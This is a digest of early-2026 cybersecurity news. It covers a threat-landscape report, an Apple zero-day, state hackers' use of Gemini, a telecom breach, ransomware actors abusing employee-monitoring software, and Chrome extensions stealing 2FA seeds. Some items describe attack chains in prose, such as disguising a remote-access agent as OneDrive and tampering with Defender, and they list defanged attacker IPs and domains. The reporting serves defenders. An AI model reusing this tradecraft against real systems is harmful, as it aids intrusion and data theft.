Israel-Iran Twelve-Day Conflict | Geopolitical

RedMike Campaign Targets Telecom Infrastructure | State-Sponsored

Chinese Actors Exploit Unpatched Cisco Devices Across 100+ Countries | State-Sponsored

Geopolitical threats and deepfakes

Thailand-Cambodia Border Clashes | Geopolitical

Russian GRU Operations Intensify Against NATO Infrastructure | State-Sponsored

Deepfake-Enabled Fraud Increases 10x Since 2024 | Emerging Technology

289 New Ransomware Variants Identified (33% YoY Increase) | Cybercrime

Synthetic Identity Fraud Up 300% | Emerging Technology

Law Enforcement Disruptions Fragment Criminal Ecosystems | Cybercrime

The converging threat landscape

Risk moves to the edges

China, Russia, Iran, and North Korea focused not on dramatic attacks but on covert accumulation of access—targeting identity systems, cloud environments, and edge infrastructure where oversight is weakest. The primary risk is no longer a single large-scale incident. It's sustained pre-positioning that enables persistent espionage and creates latent capacity for disruption.

Key Insight: Warning timelines are compressing. The adversaries are already inside.

Convergence across domains

Every major conflict in 2025 had a digital front—and the combatants weren't always who they claimed to be. Genuine intrusions, exaggerated claims, and disinformation reinforced one another across Israel-Iran, India-Pakistan, Thailand-Cambodia, and Russia-Ukraine conflicts.

Key Insight: Perception is now contested terrain. Even low-sophistication attacks generate outsized impact when amplified through coordinated information operations.

Fragmented, modular, resilient

Law enforcement achieved significant wins in 2025. But the criminal ecosystem adapted. Sustained pressure fractured large enterprises into smaller, decentralized operations. Groups adopted subscription models, outsourced operations, and relied on specialized services—creating a distributed criminal supply chain that's resilient and difficult to track.

Key Insight: Threat actors are adapting faster than defenses. Modular ecosystems mean even disrupted operations reconstitute rapidly.

Verification failure at scale

2025 was not a breakout year for AI-driven cyber operations. But the immediate risk isn't autonomous attacks—it's verification failure at scale, where deception becomes faster, cheaper, and more convincing. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

Key Insight: Organizations that act now to establish AI governance and prepare for post-quantum migration will hold significant advantages.

What 2025 teaches us about 2026

The patterns of 2025 point toward a threat environment defined by sustained uncertainty. Security leaders should prepare for:

[23] Recorded Future - Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Uncertainty has become the operating environment for business. And this year, fragmentation is driving it.

The global threat landscape didn't simplify in 2025; it shattered. Geopolitical alliances strained. Criminal enterprises splintered under law enforcement pressure, then regrouped into smaller, faster, and harder-to-track operations. State-sponsored cyber actors shifted from dramatic disruptions to quiet pre-positioning, embedding themselves in networks and waiting. Hacktivist groups and influence networks amplified conflicts, blurring the line between genuine intrusions and perception warfare.

But here's what makes this moment dangerous: as long-established norms unwind, fragmentation is paradoxically enabling greater interoperability across domains that were once distinct. State objectives, criminal capability, and private-sector technology increasingly reinforce one another. That convergence creates uncertainty, compresses warning time, and expands plausible deniability.

Today, Recorded Future's Insikt Group releases the 2026 State of Security report, our most comprehensive annual analysis of the forces shaping global security.

Drawing on proprietary intelligence, network telemetry, and deep geopolitical analysis, this report examines how 2025's fractures are reshaping the threat environment — and what security leaders must prepare for in the year ahead.

The End of Stability as a Baseline Assumption

For decades, organizations built risk models around a core premise: that the international order would hold, diplomatic mechanisms would constrain escalation, and major powers would avoid direct confrontation.

That premise no longer applies.

In 2025, the international geopolitical order fragmented as hard-power competition, transactional diplomacy, and the testing of red lines became defining features of state behavior. The Russia–Ukraine war ground into its fourth year, with Moscow maintaining a strategic advantage despite minimal territorial gains. Israel and Iran clashed directly in a twelve-day conflict that reshaped regional power dynamics. India and Pakistan escalated to ballistic missile exchanges before a US-brokered ceasefire intervened. Thailand and Cambodia exchanged fire along disputed borders, triggering the most intense fighting in nearly fifteen years.

The pattern is clear: states are increasingly willing to use force to advance objectives when diplomatic mechanisms appear unreliable. As modern power struggles threaten institutions like international law, risk is spreading across domains that have historically had clearer boundaries.

For organizations, this means geopolitical crises are increasingly likely to spill over into corporate networks, supply chains, regulatory environments, and digital infrastructure with limited warning. Resilience, not stability, became the baseline operating assumption.

State-Sponsored Actors: Risk Moves to the Edges

While kinetic conflicts dominated headlines, some of 2025's most consequential state-sponsored activity unfolded quietly in digital environments — at the edges of networks where oversight is weakest.

China, Russia, Iran, and North Korea, also known as the four most capable and consistently active hostile state cyber actors Insikt Group tracks, focused not on dramatic attacks but on the covert accumulation of access. They targeted identity systems, cloud environments, and edge infrastructure: the poorly monitored network devices, VPN appliances, and perimeter systems that organizations struggle to patch and defend.

Insikt Group's reporting on RedMike highlighted disciplined pre-positioning in telecommunications infrastructure: access built selectively and held quietly for intelligence value by threat actors ready to pivot quickly when timing and pressure align. Chinese state-sponsored actors targeted telecommunications providers worldwide, with one campaign exploiting unpatched Cisco devices across more than 100 countries. Russian GRU-linked groups intensified operations against critical infrastructure in Ukraine and NATO member states. Iranian operators blended espionage with hack-and-leak campaigns. North Korean actors merged revenue generation with espionage, deploying fraudulent IT workers embedded in foreign companies as an access vector.

The strategic shift is profound: the primary risk is no longer a single, large-scale cyber incident. It's sustained pre-positioning that enables persistent espionage in peacetime and creates latent capacity for disruption during crises. Warning timelines are compressing, as the adversaries are already inside.

Hacktivists and Influence Operators: Convergence Across Domains

Every major conflict in 2025 had a digital front, and unsurprisingly, the combatants weren't always who they claimed to be.

Hacktivist groups, patriotic volunteers, and influence networks played growing roles in conflicts involving Israel–Iran, India–Pakistan, Thailand–Cambodia, and Russia–Ukraine. These actors operated with varying degrees of state alignment but consistently contributed to a threat landscape where genuine intrusions, exaggerated claims, and disinformation reinforced one another.

Regional escalation involving Israel and Iran showed how cyber operations, influence campaigns, and commercial surveillance tools can operate alongside military force, as domains converge in ways that would have seemed implausible just years ago. During the India–Pakistan escalation, both sides deployed large-scale influence networks that spread coordinated narratives, forged military documents, and amplified hacktivist claims of grid disruptions. Russian-aligned hacktivists targeted NATO countries with DDoS campaigns, with investigations revealing that portions of this "hacktivist" ecosystem function as state-directed fronts.

The implication for defenders: perception is now contested terrain. Even low-sophistication attacks can generate outsized reputational and psychological impact when amplified through coordinated information operations.

Cybercrime: Fragmented, Modular, Resilient

Law enforcement achieved significant wins against cybercriminal infrastructure in 2025. Forum takedowns, arrests, and sanctions disrupted major operations. Ransomware payments declined for the second consecutive year.

But the criminal ecosystem just adapted to these new conditions.

Sustained pressure fractured large criminal enterprises into smaller, more decentralized operations. Insikt Group identified 289 new ransomware variants this year (a 33% increase from 2024), most of which were derived from leaked source code. Groups adopted subscription models, outsourced operations, and relied on specialized services for laundering and negotiation. The result: a distributed criminal supply chain that's resilient, decentralized, and increasingly difficult to track.

Cybercrime groups increasingly aligned with national strategic objectives, blurring the boundaries between criminal and state activity. In Venezuela, state action eroded legal, political, and cyber boundaries, challenging assumptions about sovereignty and accountability. Mercenary spyware pursued the same persistent-access goals as state actors, embedding where oversight was weakest and adapting under pressure.

English-speaking criminal actors, such as the Scattered LAPSUS$ Hunters collective, demonstrated that low-tech social engineering tactics — particularly help desk impersonation — remain devastatingly effective. Meanwhile, organized crime in Southeast Asia industrialized fraud at an unprecedented scale, with Chinese-speaking transnational criminal organizations running call center compounds using coerced labor augmented by AI-driven automation.

For organizations, the takeaway is stark: threat actors are adapting faster than defenders. Modular criminal ecosystems that share tools, infrastructure, and access can reconstitute rapidly even after disruptions.

Emerging Technologies: Verification Failure at Scale

2025 was not a breakout year for AI-driven cyber operations.

To separate hype from signal, Insikt Group developed AIM3 — our framework for assessing AI malware maturity. It shows that most observed use remains at an early stage of development. Threat actors experimented with malicious AI models tailored for cyber operations, but the results were incremental rather than transformative.

The immediate risk is not autonomous attacks. It's verification failure at scale, where deception becomes faster, cheaper, and more convincing as AI is embedded into decision workflows.

Deepfake-enabled fraud has increased more than tenfold since the start of 2024. Synthetic identity fraud rose 300% in Q1 2025 alone. Adversaries began testing prompt injection attacks and "generated-SEO" manipulation to poison AI search results. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

At the strategic level, the US–China race for AI dominance intensified, with China pursuing an aggressive diffusion strategy that's embedding Chinese LLMs into the global software ecosystem. Competition over quantum computing, advanced robotics, and space systems is extending beyond commercial markets into sustained geopolitical rivalry.

The organizations that act now to establish AI governance, inventory cryptographic dependencies, and prepare for post-quantum migration will hold significant advantages as these technologies mature.

What 2025 Teaches Us About 2026

Looking ahead, diplomatic friction, selective enforcement of norms, and accelerating technology adoption will continue to widen the gap between how risk is assumed to behave and how it actually behaves.

The patterns of 2025 point toward a 2026 threat environment defined by sustained uncertainty:

Simultaneous regional crises will become the norm. As enforcement of established norms becomes more selective, regional and emerging powers will pursue objectives more aggressively, and external intervention in internal conflicts will expand.

Connectivity disruptions will emerge as a primary tool of coercion. Undersea cables, satellite systems, and positioning/navigation/timing infrastructure are becoming strategic targets, with even limited interference capable of cascading across critical sectors.

Ransomware will fragment further. Declining payments will push threat actors toward shorter attack cycles, lower demands, and disruption-focused tactics designed to compel engagement.

The synthetic identity crisis will deepen. AI-enabled deepfakes and compromised identity verification systems will make business email compromise and social engineering more convincing and scalable.

AI will become the next great attack surface. Prompt-based manipulation will increasingly replace code-based exploits as the preferred intrusion method against AI systems.

Quantum readiness will move from planning to spending. Organizations will begin allocating dedicated budgets for cryptographic inventories, vendor transitions, and post-quantum migration pilots.

Robots and space systems will become contested cyber-physical terrain. In 2026, humanoid robots and space infrastructure will move from experimentation to operational deployment, increasing economic and strategic reliance on network-connected cyber-physical systems.

Intelligence does not eliminate uncertainty; having more access to more data points means nothing without context. Rather, intelligence makes the uncertainty more manageable.

Fragmentation creates complexity. But complexity rewards those who can see connections others miss, such as how risks across geopolitics, cyber operations, and criminal ecosystems converge to shape exposure. That's the purpose of the 2026 State of Security report: not just to catalog threats, but to help leaders reduce surprise, prioritize effectively, and act with confidence.

The full report includes detailed analysis of each threat domain, threat actor profiles, regional risk assessments, and actionable recommendations for building organizational resilience.

[24] Recorded Future - From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

The manual operations gap can be a business risk

Manual threat hunting requires 27 steps that burn analyst time

Autonomous Threat Operations can reduce 27 steps to 5

Autonomous operations prove measurable ROI

At Recorded Future, we’re constantly looking for ways to help security teams work more efficiently so they can focus their expertise where it matters most: stopping threats before they impact business.

Over the past few years, as we spent time talking to our customers and observing the ways that their SOCs actually work day to day, we discovered a troubling pattern. Every Monday morning, analysts would begin a new round of threat hunts, manually gathering intelligence, writing queries for different tools, correlating findings, and documenting results. By Friday, they’d complete their reports. Meanwhile, attackers who may have breached the network on Tuesday may have already moved laterally, established persistence, and potentially exfiltrated data.

The manual operations gap

This inefficient approach to threat hunting wasn’t a people problem. It was a process problem.

We identified that traditional manual threat hunting required 27 separate steps, from selecting threat actors and gathering intelligence sources to validating anomalies and writing up reports for stakeholders.

Each of the 27 steps consumed hours of analyst time, and the entire manual workflow created what we now call the manual operations gap—the dangerous window between when threats emerge and when security teams can respond.

Rather than accept this gap as an inevitable reality, we asked ourselves a question: How many more threats could be prevented, and how could we improve organizations’ defenses overall, if we could make manual threat operations autonomous?

Rethinking manual workflows

Threat hunting represented the perfect use case for autonomous operations. It’s a critical security function that’s highly repetitive, spans multiple tools, requires constant updates as threats evolve, and must happen continuously—not just during business hours. We knew that if we could bring autonomous functionality to threat hunting, we could demonstrate a new model for security operations.

The breakthrough came from reimagining the entire workflow around a few core principles: intelligence-driven automation, seamless cross-tool orchestration, and continuous autonomous operations. Instead of analysts manually translating intelligence into queries for each security tool, what if their systems could automatically initiate hunts across SIEM, EDR, and other platforms simultaneously? Instead of analysts having to schedule weekly hunt cycles, what if threat hunting could run 24/7, adapting in real time as new intelligence emerged?

The result of this reimagining is Autonomous Threat Operations and the autonomous threat hunting capability, a new solution that reduces 27 manual steps to as few as 5 largely automated ones, delivering the speed, scale, and effectiveness that the modern threat landscape demands.

Closing the gap with autonomous operations

The transition from manual bottlenecks to autonomous operations isn't just about working faster—it's about working smarter. Security teams need workflows that scale their expertise rather than limit it, systems that integrate their existing investments rather than replace them, and processes that prove measurable ROI to justify continued investment.

Organizations that standardize on intelligence-led operations often demonstrate measurable gains in time to detect and time to respond. They can close the gap between threat emergence and defensive action, transforming security from a reactive cost center into a proactive risk-reduction function.

Want to see exactly how leading organizations are making this transformation? Our new playbook breaks down the specific steps for moving from manual threat hunting to autonomous operations—including the precise methodology for reducing complex, multi-day processes into streamlined workflows that run continuously.

Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, and prove the ROI of your security investments in the autonomous era.

[25] Cyberscoop - Proofpoint acquires Acuvity to tackle the security risks of agentic AI

[TAM METİN - 583 kelime]
Proofpoint announced Thursday it has acquired Acuvity, an AI security startup, as the cybersecurity company moves to address security risks stemming from widespread corporate adoption of agentic AI.

The acquisition strengthens Proofpoint‘s capabilities in monitoring and securing AI-powered systems that are increasingly handling sensitive business functions across enterprises.

Financial terms of the deal were not disclosed, but Ryan Kalember, Proofpoint’s chief strategy officer, told CyberScoop that the acquisition was beyond a pure “technology acquisition,” with Acuvity’s engineering team slated to join the California-based company.

Acuvity specializes in visibility and governance for AI applications, including the ability to track how employees and automated systems interact with external AI services and protect custom AI models developed within organizations. The startup’s platform monitors AI usage across multiple deployments, from web browsers to specialized infrastructure including Model Context Protocol (MCP) servers and locally installed AI tools.

The deal reflects growing concern among enterprises about security gaps created as organizations deploy agentic AI across departments, like software development, customer support, finance, and legal operations. These systems increasingly access sensitive data and execute tasks previously handled exclusively by humans.

Additionally, AI-specific attack vectors such as prompt injection and model manipulation have emerged as potential threats that traditional cybersecurity tools were not designed to address.

Kalember said CISOs are seeing the potential risk combined with agentic AI growth, and are sensing the need to maintain governance without impeding innovation, particularly as the pace of AI adoption has outstripped many companies’ ability to secure these systems effectively.

“It has definitely been a pivot from, ‘I got to be able to stop prompt injection’ to ‘I have to be able to figure out what the AI is even doing,’” he told CyberScoop.

Last May, Proofpoint acquired Hornetsecurity Group, a Germany-based provider of Microsoft 365 security services, in a deal reportedly valued at more than $1 billion. Kalember told CyberScoop he sees Acuvity helping small- and medium-sized organizations that leverage Hornetsecurity’s offerings to boost its AI security.

“That is going to be a world in which, independent of the size of the organization, they are going to very much leverage AI, and some of that will be built into the tools like M365 that is tightly coupled with the Hornetsecurity architecture,” Kalember said.The acquisition follows a theme within the industry where larger security companies are buying AI-focused security startups. Just last week, data security firm Varonis acquired AI security firm AllTrue.ai for $150 million.

[26] Cyberscoop - Apple discloses first actively exploited zero-day of 2026

[TAM METİN - 527 kelime]
Apple disclosed a zero-day vulnerability Wednesday that the vendor warned was previously “exploited in an extremely sophisticated attack against specific targeted individuals,” the company said in a security update.

The memory-corruption vulnerability — CVE-2026-20700 — affects iPhones and iPads and was exploited on devices running versions of iOS before iOS 26. The Cybersecurity and Infrastructure Security Agency added the defect to its known exploited vulnerabilities catalog Thursday.

The disclosure marks the first zero-day reported by Apple since late 2025, and the first Apple defect flagged as actively exploited by CISA this year.

“An attacker with memory write capability may be able to execute arbitrary code,” the company said.

Apple, which typically shares limited details about in-the-wild exploitation of zero-days, noted the latest zero-day, similar to others it disclosed last year, was exploited by sophisticated attackers targeting distinct people.

The company did not immediately respond to a request for comment and did not describe the nature or objectives of the attacks.

Caitlin Condon, vice president of security research at VulnCheck, said the zero-day was likely exploited as part of a highly targeted spyware or surveillance attack on a very small number of individuals’ devices.

The zero-day vulnerability, which was discovered by Google Threat Intelligence Group, affects dyld, Apple’s open-source dynamic link editor that acts as a core system component to securely load applications on users’ devices.

Apple said a pair of additional vulnerabilities affecting WebKit — CVE-2025-14174 and CVE-2025-43529 — were previously disclosed in response to attacks involving CVE-2026-20700.

The company did not describe how the three vulnerabilities are related, but previously noted CVE-2025-43529 was “exploited in an extremely sophisticated attack against specific targeted individuals.”

All three of the memory-corruption defects affect mobile operating systems, “where sophisticated zero-day attacks are commonly employed to surveil individuals, whether those are political dissidents, journalists, public figures or other high-value targets,” Condon said.

“Memory-corruption exploits are also commonly seen in sophisticated attacks, as they’re tricky to exploit reliably but provide elevated access,” she added.

Apple’s security updates for iOS 26.3 and iPadOS 26.3 addresses 38 vulnerabilities total, but CVE-2026-20700 is the only defect it disclosed as actively exploited prior to public disclosure.

[27] Cyberscoop - Google finds state-sponsored hackers use AI at ‘all stages’ of attack cycle 
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 21:24:46 +0000

[TAM METİN - 733 kelime]
A new report from Google found evidence that state-sponsored hacking groups have leveraged AI tool Gemini at nearly every stage of the cyber attack cycle.

The research underscores how AI tools have matured in their cyber offensive capabilities, even as it doesn’t reveal novel or paradigm shifting uses of the technology.

John Hultquist, chief analyst at Google’s Threat Intelligence Group, told CyberScoop that many countries still appear to be experimenting with AI tools, determining where they best fit into the attack chain and provide more benefit than friction.

“Nobody’s got everything completely worked out,” Hultquist said. “They’re all trying to figure this out and that goes for attacks on AI, too.”

But the report also reveals that frontier AI models can build speed, scale and sophistication into a myriad of hacking tasks, and state-sponsored hacking groups are taking advantage.

Gemini was a useful, dynamic and convenient tool for many tasks, helping threat actors in a variety of different ways. In nearly all cases, Google’s reporting suggests that state-sponsored actors relied on Gemini as one tool among many, using it for specific purposes such as automating routine processes, conducting research or reconnaissance and experimenting with malware.

One North Korean group used it to synthesize open-source intelligence about job roles and salary information at cybersecurity and defense companies. Another North Korean group consulted it “multiple days a week” for technical support, using it to troubleshoot problems and generate new malware code when they got stuck during an operation. One Iranian APT used Gemini to “significantly augment reconnaissance” techniques against targeted victims. China, Russia, Iran and North Korea all also used Gemini to create fake articles, personas, and other assets for information operations.

“What’s so interesting about this capability is it’s going to have an effect across the entire intrusion cycle,” Hultquist said.

There are no instances of state groups using Gemini to automate large portions of a cyber attack, like a Chinese-government backed campaign identified by Anthropic last year. It suggests threat actors may still be struggling to implement fully or mostly-automated hacks using AI.

Hultquist said that some state groups, particularly those focused on espionage, may not find the speed and scale advantages of agentic AI useful if it results in louder, more detectable operations. In fact, while state actors continue to experiment with AI models, he believes on average these developments will help smaller cybercriminal outfits more than state-sponsored hackers.

But that could change in the future. Frontier AI companies like Anthropic and cybersecurity startups like XBOW have already developed models with powerful defensive cybersecurity capabilities in vulnerability scanning, reconnaissance and automation. Foreign governments with similar technology could use those same features for offensive hacking, as Chinese actors did with Claude before being discovered.

In December, the UK AI Security Institute’s inaugural report on frontier AI trends found that Al capabilities are improving rapidly across all tested domains, and particularly in cybersecurity.

And the gap between frontier and free, open-source models is shrinking. According to the institute, open-source AI models can now catch up and provide similar capabilities within 4-8 months of a frontier model release.

“The duration of cyber tasks that Al systems can complete without human direction is also rising steeply, from less than 10 minutes in early 2023 to over an hour by mid-2025,” the institute said in its Frontier AI Trends Report in December.

[28] The Register - Top Dutch telco Odido admits 6.2M customers caught in contact system caper

Top Dutch telco Odido admits 6.2M customers caught in contact system caper

Names, addresses, bank account numbers accessed – but biz insists passwords and call data untouched

The Netherlands' largest mobile network operator (MNO) has admitted that a breach of its customer contact system may have affected around 6.2 million people.

Odido said that attackers gained access to a range of personal data, including names, home and email addresses, phone numbers, dates of birth, bank account numbers, and ID document details.

The telco insisted that attackers could never have seen passwords, call details, billing or location data, or scans of the ID documents.

It spotted the first signals indicating a breach over the weekend of February 7-8 and promptly reported the incident to the Dutch Data Protection Authority.

Odido said the stolen data has not been published, but warned that it could appear online at some point in the future.

Around 6.2 million people were affected by this attack in some way, the telco told local news media, including its own customers and those of Ben, another MNO owned by Odido. Simpel, a low-budget MNO also under Odido's management, was unaffected.

The company is in the process of informing all affected individuals, either via email (info@mail.odido.nl) or SMS. This message will be tailored to each customer, telling them exactly what personal data was stolen.

In its disclosure, Odido also included tips about what customers should be aware of following the breach, such as scams attackers may attempt using the stolen data for financial gain.

Because names, addresses, phone numbers, and bank account numbers were included in the stolen data, Odido said that cybercriminals may use this to impersonate the telco, the customer's bank, or another third party.

Odido also advised customers about the different ways they can verify a caller's identity if they say they're calling from a bank, and to be wary of fake invoices with company branding, trying to get customers to pay the criminals directly.

CEO Søren Abildgaard said Odido "immediately took additional security measures" after shutting down the attacker's access, as well as informing the data regulator.

"Odido has been affected by a cyberattack, in which customer data has been impacted," said Abildgaard in a letter to customers. "This involves personal data originating from a customer contact system used by Odido. No passwords, call details, or billing data are involved.

"We deeply regret this incident and are fully committed to limiting the impact of this incident and providing our customers with all necessary support. It is important to emphasize that our operational services have not been affected; customers can continue to call, use the internet, and watch TV safely.

"Unauthorized access to the system was ended as quickly as possible. In addition, Odido has engaged external cybersecurity experts to support the implementation of additional security measures as part of the response to this incident."

The Register approached Odido for more information. ®

[29] The Register - Who's the bossware? Ransomware slingers like employee monitoring tools, too

Who's the bossware? Ransomware slingers like employee monitoring tools, too

As if snooping on your workers wasn't bad enough

Your supervisor may like using employee monitoring apps to keep tabs on you, but crims like the snooping software even more. Threat actors are now using legit bossware to blend into corporate networks and attempt ransomware deployment.

In late January and early February, the Huntress response team spotted two intrusions in which criminals chained Net Monitor for Employees Professional with remote monitoring and management (RMM) tool SimpleHelp, and then attempted to deploy ransomware on the victims' computers.

While the crims were ultimately unsuccessful, the security incidents highlight how miscreants love to use legitimate, commercial software for nefarious purposes because it makes it easier for them to hide inside enterprise IT environments.

"RMMs and employee monitoring tools blend in amongst legitimate signed binaries," Michael Tigges, senior security operations analyst at Huntress, told The Register, adding that "this is a rare case of the employee monitoring software being co-opted for subsequent access."

While neither of the victims' employers uses Net Monitor, repurposing this type of employee monitoring software falls into the "same category of RMM abuse," Tigges said. "Delineating which may be malicious and benign at first glance is exceedingly difficult. Adversaries know this as well."

The victims, we're told, were from different industry sectors, and "likely targets of opportunity rather than any specifically targeted group," he added.

This is a rare case of the employee monitoring software being co-opted for subsequent access

Tigges points out that "there are legitimate use cases for employee monitoring software - chiefly around data loss prevention."

This particular brand of bossware, however, does a whole lot more than passive screen monitoring. It can also establish remote shell connections and remotely execute commands on users' desktops. That makes it ideal for crims to use, even without modifying or infecting the installers.

"Threat actors leveraged this capability for hands-on-keyboard reconnaissance, additional tooling delivery, and deploying secondary remote access channels, effectively turning an employee monitoring tool into a fully functional RAT (remote access trojan)," Tigges and fellow threat hunters Anna Pham, Dray Agha, and Anton Ovrutsky wrote in a Wednesday blog.

As The Register previously reported, spying on workers is also bad for morale and doesn't inspire loyalty to the company, not to mention that employer-sanctioned RATs are creepy as all hell.

Here's what went down

In the first case that the Huntress team observed in late January, the attacker somehow installed Net Monitor for Employees on the victim's machine. Huntress doesn't know how the intruder gained initial access.

But once they had broken in, the criminals set to work manipulating user accounts via multiple net commands. This included attempting to identify valid usernames, reset passwords, and create new admin-user accounts on the host.

"As we kept pulling on investigative threads, we observed the 'Net Monitor for Employees' terminal pulling down a file via PowerShell named vhost.exe from the IP address of 160.191.182[.]41," the threat hunters wrote.

The executable turned out to be SimpleHelp, which the attacker then used in multiple attempts to tamper with Windows Defender. When this wasn't successful, the intruder tried to deploy multiple versions of Crazy ransomware linked to VoidCrypt.

In the second incident, which happened in early February, the attacker used a compromised third-party SSL VPN account to gain initial access to the victim's computer. Next, they connected to a domain controller using remote desktop protocol, launched a PowerShell session, and installed the Net Monitor agent, configuring the reverse connection to call back to an attacker-controlled console.

Net Monitor allows users to customize the service and process names, and the intruder took advantage of this to disguise the agent as Microsoft OneDrive, registering the service as OneDriveSvc, naming the process OneDriver.exe, and renaming the running binary to svchost.exe.

Ransomware crews add 'EDR killers' to their arsenal – and some aren't even malware

Then, the intruder installed SimpleHelp and configured it to monitor for keywords that would indicate cryptocurrency wallets, exchanges, blockchain explorers, and payment platforms. This, Huntress notes, indicates "the threat actor's financial motivation extends beyond ransomware to direct cryptocurrency theft."

The SimpleHelp agent also monitored for remote tool access keywords including RDP, AnyDesk, TeamViewer, and VNC.

Meanwhile, they used Net Monitor for Employees Professional to perform network reconnaissance on the compromised domain controller, probe internal network segments, and map out the network settings.

Huntress says shared infrastructure used in both cases, plus the reuse of the vhost.exe filename and overlapping IP addresses, "strongly suggest" a single attacker or group behind the two intrusions.

And to prevent becoming the next victim, turn on multi-factor authentication (MFA) on all remote access services and external-facing applications, and limit remote access to only those users and systems that require it to do their jobs.

The security analysts also suggest conducting regular audits of all third-party RMM tools and employee monitoring software, and monitoring for any unusual process execution chains. ®

Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Flaw abused 'in an extremely sophisticated attack against specific targeted individuals'

Apple patched a zero-day vulnerability affecting every iOS version since 1.0, used in what the company calls an "extremely sophisticated attack" against targeted individuals.

CVE-2026-20700, discovered by Google's Threat Analysis Group, affects dyld - Apple's dynamic linker - and allows attackers with memory write capability to execute arbitrary code. Apple said the flaw was exploited in the wild and may have been part of an exploit chain.

Its advisory stated: "An attacker with memory write capability may be able to execute arbitrary code. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26."

Google's researchers also referenced two December vulnerabilities in their report that both carry 8.8 CVSS scores.

CVE-2025-14174 is an out-of-bounds memory access flaw in Google Chrome's ANGLE graphics engine on Mac that could be exploited through a malicious webpage.

The other, CVE-2025-43529, is a use-after-free leading to code execution.

Brian Milbier, deputy CISO at Huntress, said: "Think of dyld as the doorman for your phone. Every single app that wants to run must first pass through this doorman to be assembled and given permission to start.

"Usually, the doorman checks credentials and places apps in a high-security 'sandbox' where they can't touch your private data. This vulnerability allows an attacker to trick the doorman into handing over a master key before security checks even begin."

By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, "attackers have created a 'zero-click' or 'one-click' path to total control. They use a fake ID to bypass the front gate – your browser – and then exploit the doorman's flaw to take over the entire building," Milbier added.

"This level of sophistication resembles other exploits developed by the commercial surveillance industry. These are private companies that also developed prominent spyware tools like Pegasus and Predator. They sell these types of exploits or tools to government clients. While some updates in this patch address minor issues, such as data leakage from physical access, the dyld/WebKit chain is in a different league. iOS 26.3 closes a door that has been unlocked for over a decade."

Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®

[1] The Hacker News - Malicious Chrome Extensions Caught Stealing Business Data, Emails, and Browsing History
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 16:55:00 +0530
Link: https://thehackernews.com/2026/02/malicious-chrome-extensions-caught.html

[TAM METİN - 1367 kelime]
Cybersecurity researchers have discovered a malicious Google Chrome extension that's designed to steal data associated with Meta Business Suite and Facebook Business Manager.

The extension, named CL Suite by @CLMasters (ID: jkphinfhmfkckkcnifhjiplhfoiefffl), is marketed as a way to scrape Meta Business Suite data, remove verification pop-ups, and generate two-factor authentication (2FA) codes. The extension has 33 users as of writing. It was first uploaded to the Chrome Web Store on March 1, 2025.

However, the browser add-on also exfiltrates TOTP codes for Facebook and Meta Business accounts, Business Manager contact lists, and analytics data to infrastructure controlled by the threat actor, Socket said.

"The extension requests broad access to meta.com and facebook.com and claims in its privacy policy that 2FA secrets and Business Manager data remain local," security researcher Kirill Boychenko said.

"In practice, the code transmits TOTP seeds and current one-time security codes, Meta Business 'People' CSV exports, and Business Manager analytics data to a backend at getauth[.]pro, with an option to forward the same payloads to a Telegram channel controlled by the threat actor."

By targeting users of Meta Business Suite and Facebook Business Manager, the threat actor behind the operation has leveraged the extension to conduct data collection and exfiltration without users' knowledge or consent.

While the extension does not have capabilities to steal password-related information, the attacker could obtain such information beforehand from other sources, such as infostealer logs or credential dumps, and then use the stolen codes to gain unauthorized access to victims' accounts.

The full scope of the malicious add-on's capabilities is listed below -

Steal TOTP seed (a unique, alphanumeric code that's used to generate time-based one-time passwords) and 2FA code

Target Business Manager "People" view by navigating to facebook[.]com and meta[.]com and build a CSV file with names, email addresses, roles and permissions, and their status and access details.

Enumerate Business Manager-level entities and their linked assets and build a CSV file of Business Manager IDs and names, attached ad accounts, connected pages and assets, and billing and payment configuration details.

Socket warned that despite the low number of installs, the extension gives the threat actor enough information to identify high-value targets and mount follow-on attacks.

"CL Suite by @CLMasters shows how a narrow browser extension can repackage data scraping as a 'tool' for Meta Business Suite and Facebook Business Manager," Boychenko said.

"Its people extraction, Business Manager analytics, popup suppression, and in-browser 2FA generation are not neutral productivity features, they are purpose-built scrapers for high-value Meta surfaces that collect contact lists, access metadata, and 2FA material straight from authenticated pages."

Chrome Extensions Hijack VKontakte Accounts

The disclosure comes as Koi Security found that about 500,000 VKontakte users have had their accounts silently hijacked through Chrome extensions masquerading as VK customization tools. The large-scale campaign has been codenamed VK Styles.

The malware embedded in the extensions is designed to engage in active account manipulation by automatically subscribing users to the attacker's VK groups, resetting account settings every 30 days to override user preferences, manipulating Cross-Site Request Forgery (CSRF) tokens to bypass VK's security protections, and maintaining persistent control.

The activity has been traced to a threat actor operating under the GitHub username 2vk, who has relied on VK's own social network to distribute malicious payloads and build a follower base through forced subscriptions. The names of the extensions are listed below -

VK Styles - Themes for vk.com (ID: ceibjdigmfbbgcpkkdpmjokkokklodmc)

VK Music - audio saver (ID: mflibpdjoodmoppignjhciadahapkoch)

Music Downloader - VKsaver (ID: lgakkahjfibfgmacigibnhcgepajgfdb)

vksaver - music saver vk (ID: bndkfmmbidllaiccmpnbdonijmicaafn)

VKfeed - Download Music and Video from VK (ID: pcdgkgbadeggbnodegejccjffnoakcoh)

One of the defining traits of the campaign is the use of a VK profile's ("vk[.]com/m0nda") HTML metadata tags as a dead drop resolver to conceal the next-stage payload URLs and, therefore, evade detection. The next-stage payload is hosted in a public repository named "-" that's associated with 2vk. Present in the payload is obfuscated JavaScript that's injected into every VK page the victim visits.

The repository is still accessible as of writing, with the file, simply named "C," receiving a total of 17 commits between June 2025 and January 2026, as the operator refined and added new functionality.

